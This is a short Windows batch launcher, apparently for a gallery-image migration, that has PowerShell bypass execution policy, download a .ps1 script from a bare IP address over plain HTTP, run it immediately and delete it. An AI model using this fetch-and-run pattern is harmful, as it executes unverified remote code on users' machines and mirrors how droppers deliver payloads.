@echo off
echo Downloading script from server...
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
  "$url='http://147.182.242.54:8081/migrate_missing_gallery_images.ps1'; $tmp=[System.IO.Path]::GetTempFileName()+'_rdmig.ps1'; (New-Object Net.WebClient).DownloadFile($url,$tmp); & $tmp; Remove-Item $tmp -Force"
pause
